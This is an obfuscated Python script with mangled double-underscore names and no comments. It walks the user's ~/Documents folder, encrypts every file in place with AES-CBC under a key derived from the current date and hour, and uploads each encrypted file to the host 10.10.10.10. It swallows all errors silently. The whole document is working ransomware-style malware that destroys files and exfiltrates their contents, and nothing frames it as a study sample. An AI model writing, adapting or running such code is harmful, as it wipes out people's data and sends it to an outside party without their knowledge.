import os as __o__
import datetime as __d__
from Crypto.Cipher import AES as __a__
from Crypto.Util.Padding import pad as __p__
import requests as __r__

__k1__ = __d__.datetime.now().strftime('%d:%m:%Y-%H').encode().ljust(32, b'\0')[:32]
__iv__ = b'\x00' * 16

def __x7__(_p, _k):
    try:
        with open(_p, 'rb') as __f1__:
            __d1__ = __f1__.read()
        __c1__ = __a__.new(_k, __a__.MODE_CBC, iv=__iv__)
        __e1__ = __c1__.encrypt(__p__(__d1__, 16))
        with open(_p, 'wb') as __f2__:
            __f2__.write(__e1__)
        __r__.post('http://10.10.10.10/?filename=' + _p.split('/')[-1], data=__e1__)
    except:
        pass
    return None

__r1__ = __o__.path.expanduser('~/Documents')
for __r2__, __, __f3__ in __o__.walk(__r1__):
    for __f4__ in __f3__:
        try:
            __x7__(__o__.path.join(__r2__, __f4__), __k1__)
        except:
            pass
